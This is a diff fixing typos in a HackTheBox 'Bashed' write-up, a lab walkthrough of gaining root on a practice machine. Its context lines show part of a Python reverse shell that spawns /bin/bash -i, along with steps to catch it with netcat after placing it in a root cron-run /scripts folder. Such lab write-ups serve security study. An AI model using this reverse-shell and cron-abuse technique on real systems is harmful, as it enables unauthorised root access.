@@ -5,7 +5,7 @@ categories: [Writeups, hackthebox]
 tags: [htb, linux, machines, bashed, apache, ubuntu, nmap, webshell, http, php, dirbuster, sudo, python, cron]
 ---
 
-Bashed is a Linux machine running just a Web Server. However, this server is also used by for development by the Administrator. As we enumerate the service, we can see that the HTTP service account is given sudo privileges and Apache Web Seerver is also running on default config. The cron job running as root user execute scripts without any sanity check. 
+Bashed is a Linux machine running just a Web Server. However, this server is also used for development by the Administrator. As we enumerate the service, we can see that the HTTP service account is given sudo privileges and Apache Web Seerver is also running on default config. The cron job running as root user execute scripts without any sanity check. 
 
 ## Information Gathering
 
@@ -83,7 +83,7 @@ $ sudo -u scriptmanager bash -i
 ```
 
 ### Root
-User account **scriptmanager** does not have sudo privliges. We can run enumeration scripts to look for weeknesses but navigating through the filesystem, this conspicuous `/scripts` folder stand out too much.
+Account **scriptmanager** does not have sudo privliges. We can run enumeration scripts to look for weeknesses but navigating through the filesystem, this conspicuous `/scripts` folder stand out too much.
 
 ![scripts_folder](/assets/img/sample/htb-bashed-scripts-folder.png)
 
@@ -115,6 +115,6 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/bash","-i"])
 ```
-And that should be it!! Liten on `2223` port on our machine with `netcat` and upload the script to **/scripts/test.py**. As soon as the cron job kicks in, we get the reverse shell on our machine as **root**
+And that should be it!! Listen on `2223` port on our machine with `netcat` and upload the script to **/scripts/test.py**. As soon as the cron job kicks in, we get the reverse shell on our machine as **root**
 
 ![root_shell](/assets/img/sample/htb-bashed-root-shell.png)
